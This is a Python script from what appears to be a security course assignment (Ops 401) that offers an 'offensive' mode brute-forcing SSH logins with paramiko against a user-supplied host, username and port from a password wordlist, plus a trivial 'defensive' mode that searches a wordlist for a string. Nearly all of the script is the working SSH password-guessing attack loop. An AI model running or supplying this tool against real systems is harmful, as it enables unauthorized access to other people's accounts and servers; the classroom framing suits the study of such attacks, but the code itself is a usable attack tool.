#!/usr/bin/python3

# Script Name: Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Class Name: Ops 401
# Author Name: Carsten Rossen
# Date of Latest Revision: 4/27/21 
# Purpose: Searches a text file for a specified string, or attempts to authenticate into
# Purpose: a specified user, host, and password list, using SSH on a specified port.


# Import libraries

import time, paramiko, sys, socket


# Declare functions

# Menu system
def menu():
    print("Which mode would you like to enter?")
    print("   1. Offensive; SSH Hacker")
    print("   2. Defensive; Password Recognizer")
    print("   3. Quit")
    choice = input("\n(1/2/3) >>> ")
    return choice

# Iterates through a password list and initiates authentication attempt for each password
def offensive():
    # gets the file path
    wordlist = input("\nFull file path of password list: ")

    # gets the host IP address
    hostip = input("Host IP: ")

    # gets the host username
    username = input("Host username: ")

    # gets the port to attempt SSH authentication on
    port = input("Host port: ")

    # notifies the user that the attack has started
    print("Running brute force attack...\n")
    
    # opens the file in read mode
    with open(wordlist, 'r') as file:

        # puts all of the file's words into a list
        words = list(file.read().split())

        # iterates through the password list
        for word in words:
            # determines whether or not the authentication was successful
            response = ssh_connect(hostip, port, username, word)

            if response == 0:
                # successful authentication
                print(f"SUCCESS: Authentication to {username}@{hostip} on port {port} succeeded using the password: {word}\n")
                break
            elif response == 1:
                # unsuccessful authentication
                print(f"FAIL: Authentication to {username}@{hostip} on port {port} failed using the password: {word}")
            elif response == 2:
                # connection failed ... host down
                print(f"Connection could not be established to {hostip}\n")
                break

# Attempts SSH connection using inputed parameters
def ssh_connect(hostip, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Sets the default code to a successful connection
    code = 0

    try:
        # tries to connect to the host
        ssh.connect(hostip, port=port, username=username, password=password)
    except paramiko.AuthenticationException:
        # Authentication failed
        code = 1
    except socket.error:
        # Connection failed
        code = 2

    ssh.close()

    # Returns the result
    return code

# Searches a text file for a specified string
def defensive():
    # get the search string
    string = input("\nPlease specify a string to search for: ")
    
    # get the file path
    wordlist = input("\nPlease give the word list's full file path: ")
    
    # open the file in read mode
    with open(wordlist, 'r') as file:

        # search file for the specified string and print result
        if string in file.read():
            print("\nThe string appeared in the word list.")
        else:
            print("\nThe string did not appear in the word list.")


# Main

# Get user input from menu system.
# The script will come back to the menu system after each task until the user elects to quit.
while True: 
    choice = menu()
    if choice == "1":
        offensive()
    elif choice == "2":
        defensive()
    elif choice == "3":
        quit()
    else:
        # Display the menu system again if the user input is faulty.
        print("Error: Only enter 1, 2, or 3.\n")


# End